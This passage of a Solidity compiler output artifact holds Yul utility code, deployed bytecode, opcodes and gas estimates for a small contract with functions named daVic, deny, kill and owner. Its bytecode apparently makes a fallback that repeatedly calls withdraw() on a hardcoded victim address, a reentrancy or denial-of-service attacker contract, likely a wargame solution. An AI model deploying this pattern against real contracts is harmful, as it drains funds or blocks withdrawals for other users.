															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "440:5:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "447:4:1",
																				"type": "",
																				"value": "0x20"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "436:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "436:16:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "454:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "459:6:1"
																	}
																],
																"functionName": {
																	"name": "copy_memory_to_memory",
																	"nodeType": "YulIdentifier",
																	"src": "414:21:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "414:52:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "414:52:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "475:23:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "486:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "491:6:1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "482:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "482:16:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "475:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "220:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "227:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "235:3:1",
														"type": ""
													}
												],
												"src": "131:373:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "644:137:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "655:100:1",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "742:6:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "751:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "662:79:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "662:93:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "655:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "765:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "772:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "765:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "623:3:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "629:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "640:3:1",
														"type": ""
													}
												],
												"src": "510:271:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "885:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "895:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "907:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "918:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "903:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "903:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "895:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "975:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "988:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "999:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "984:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "984:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "931:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "931:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "931:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "857:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "869:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "880:4:1",
														"type": ""
													}
												],
												"src": "787:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1073:40:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1084:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1100:5:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "1094:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1094:12:1"
															},
															"variableNames": [
																{
																	"name": "length",
																	"nodeType": "YulIdentifier",
																	"src": "1084:6:1"
																}
															]
														}
													]
												},
												"name": "array_length_t_bytes_memory_ptr",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1056:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "1066:6:1",
														"type": ""
													}
												],
												"src": "1015:98:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1232:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1242:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1257:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "1242:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1204:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "1209:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "1220:11:1",
														"type": ""
													}
												],
												"src": "1119:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1317:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1327:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1356:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "1338:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1338:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1327:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1299:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1309:7:1",
														"type": ""
													}
												],
												"src": "1272:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1419:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1429:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1444:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1451:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "1440:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1440:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1429:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1401:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1411:7:1",
														"type": ""
													}
												],
												"src": "1374:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1555:258:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "1565:10:1",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "1574:1:1",
																"type": "",
																"value": "0"
															},
															"variables": [
																{
																	"name": "i",
																	"nodeType": "YulTypedName",
																	"src": "1569:1:1",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1634:63:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "1659:3:1"
																						},
																						{
																							"name": "i",
																							"nodeType": "YulIdentifier",
																							"src": "1664:1:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "1655:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "1655:11:1"
																				},
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"name": "src",
																									"nodeType": "YulIdentifier",
																									"src": "1678:3:1"
																								},
																								{
																									"name": "i",
																									"nodeType": "YulIdentifier",
																									"src": "1683:1:1"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "1674:3:1"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "1674:11:1"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "1668:5:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "1668:18:1"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "1648:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1648:39:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1648:39:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "1595:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1598:6:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "1592:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1592:13:1"
															},
															"nodeType": "YulForLoop",
															"post": {
																"nodeType": "YulBlock",
																"src": "1606:19:1",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "1608:15:1",
																		"value": {
																			"arguments": [
																				{
																					"name": "i",
																					"nodeType": "YulIdentifier",
																					"src": "1617:1:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1620:2:1",
																					"type": "",
																					"value": "32"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "1613:3:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1613:10:1"
																		},
																		"variableNames": [
																			{
																				"name": "i",
																				"nodeType": "YulIdentifier",
																				"src": "1608:1:1"
																			}
																		]
																	}
																]
															},
															"pre": {
																"nodeType": "YulBlock",
																"src": "1588:3:1",
																"statements": []
															},
															"src": "1584:113:1"
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1731:76:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "1781:3:1"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "1786:6:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "1777:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "1777:16:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1795:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "1770:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1770:27:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1770:27:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "1712:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1715:6:1"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "1709:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1709:13:1"
															},
															"nodeType": "YulIf",
															"src": "1706:2:1"
														}
													]
												},
												"name": "copy_memory_to_memory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "src",
														"nodeType": "YulTypedName",
														"src": "1537:3:1",
														"type": ""
													},
													{
														"name": "dst",
														"nodeType": "YulTypedName",
														"src": "1542:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "1547:6:1",
														"type": ""
													}
												],
												"src": "1506:307:1"
											}
										]
									},
									"contents": "{\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, length)\n    }\n\n    function abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos , value0) -> end {\n\n        pos := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value0,  pos)\n\n        end := pos\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_length_t_bytes_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function copy_memory_to_memory(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        if gt(i, length)\n        {\n            // clear end\n            mstore(add(dst, length), 0)\n        }\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100435760003560e01c806341c0e1b51461004e5780638da5cb5b14610065578063a3fdfee314610090578063f787e039146100a757610044565b5b61004c6100d2565b005b34801561005a57600080fd5b506100636101e7565b005b34801561007157600080fd5b5061007a610278565b6040516100879190610319565b60405180910390f35b34801561009c57600080fd5b506100a56100d2565b005b3480156100b357600080fd5b506100bc61029c565b6040516100c99190610319565b60405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662788b606040516024016040516020818303038152906040527f3ccfd60b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161019f9190610302565b60006040518083038160008787f1925050503d80600081146101dd576040519150601f19603f3d011682016040523d82523d6000602084013e6101e2565b606091505b505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461023f57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6102cb8161034a565b82525050565b60006102dc82610334565b6102e6818561033f565b93506102f681856020860161037c565b80840191505092915050565b600061030e82846102d1565b915081905092915050565b600060208201905061032e60008301846102c2565b92915050565b600081519050919050565b600081905092915050565b60006103558261035c565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60005b8381101561039a57808201518184015260208101905061037f565b838111156103a9576000848401525b5050505056fea26469706673582212208f4ba91fe955d6f69bd8e42f870757785d4005dc063b4bd7ca20415b67bb532464736f6c63430008020033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x41C0E1B5 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x65 JUMPI DUP1 PUSH4 0xA3FDFEE3 EQ PUSH2 0x90 JUMPI DUP1 PUSH4 0xF787E039 EQ PUSH2 0xA7 JUMPI PUSH2 0x44 JUMP JUMPDEST JUMPDEST PUSH2 0x4C PUSH2 0xD2 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x63 PUSH2 0x1E7 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x71 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x7A PUSH2 0x278 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x87 SWAP2 SWAP1 PUSH2 0x319 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xA5 PUSH2 0xD2 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xBC PUSH2 0x29C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xC9 SWAP2 SWAP1 PUSH2 0x319 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH3 0x788B60 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x3CCFD60B00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x19F SWAP2 SWAP1 PUSH2 0x302 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP8 CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1DD JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1E2 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x23F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH2 0x2CB DUP2 PUSH2 0x34A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2DC DUP3 PUSH2 0x334 JUMP JUMPDEST PUSH2 0x2E6 DUP2 DUP6 PUSH2 0x33F JUMP JUMPDEST SWAP4 POP PUSH2 0x2F6 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x37C JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x30E DUP3 DUP5 PUSH2 0x2D1 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x32E PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2C2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x355 DUP3 PUSH2 0x35C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x39A JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x37F JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x3A9 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP16 0x4B 0xA9 0x1F 0xE9 SSTORE 0xD6 0xF6 SWAP12 0xD8 0xE4 0x2F DUP8 SMOD JUMPI PUSH25 0x5D4005DC063B4BD7CA20415B67BB532464736F6C6343000802 STOP CALLER ",
							"sourceMap": "57:527:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;565:6;:4;:6::i;:::-;57:527;328:81;;;;;;;;;;;;;:::i;:::-;;88:20;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;417:104;;;;;;;;;;;;;:::i;:::-;;115:65;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;417:104;451:5;;;;;;;;;;;:10;;466:7;475:37;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;451:62;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;417:104::o;328:81::-;296:5;;;;;;;;;;284:17;;:10;:17;;;276:26;;;;;;394:5:::1;::::0;::::1;;;;;;;;372:29;;;88:20:::0;;;;;;;;;;;;:::o;115:65::-;;;;;;;;;;;;;:::o;7:118:1:-;94:24;112:5;94:24;:::i;:::-;89:3;82:37;72:53;;:::o;131:373::-;;263:38;295:5;263:38;:::i;:::-;317:88;398:6;393:3;317:88;:::i;:::-;310:95;;414:52;459:6;454:3;447:4;440:5;436:16;414:52;:::i;:::-;491:6;486:3;482:16;475:23;;239:265;;;;;:::o;510:271::-;;662:93;751:3;742:6;662:93;:::i;:::-;655:100;;772:3;765:10;;644:137;;;;:::o;787:222::-;;918:2;907:9;903:18;895:26;;931:71;999:1;988:9;984:17;975:6;931:71;:::i;:::-;885:124;;;;:::o;1015:98::-;;1100:5;1094:12;1084:22;;1073:40;;;:::o;1119:147::-;;1257:3;1242:18;;1232:34;;;;:::o;1272:96::-;;1338:24;1356:5;1338:24;:::i;:::-;1327:35;;1317:51;;;:::o;1374:126::-;;1451:42;1444:5;1440:54;1429:65;;1419:81;;;:::o;1506:307::-;1574:1;1584:113;1598:6;1595:1;1592:13;1584:113;;;1683:1;1678:3;1674:11;1668:18;1664:1;1659:3;1655:11;1648:39;1620:2;1617:1;1613:10;1608:15;;1584:113;;;1715:6;1712:1;1709:13;1706:2;;;1795:1;1786:6;1781:3;1777:16;1770:27;1706:2;1555:258;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "199400",
								"executionCost": "41978",
								"totalCost": "241378"
							},
							"external": {
								"": "infinite",
								"daVic()": "1258",
								"deny()": "infinite",
								"kill()": "31822",
								"owner()": "1211"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 57,
									"end": 584,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 57,
									"end": 584,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 57,
									"end": 584,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 138,
									"end": 180,
									"name": "PUSH",
									"source": 0,
									"value": "20FF93B3C7955B056B4FAAA42CD705CC487EE814"
								},
								{
									"begin": 115,
									"end": 180,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 115,
									"end": 180,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 115,
									"end": 180,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 115,
									"end": 180,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 115,
									"end": 180,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "PUSH",
									"source": 0,
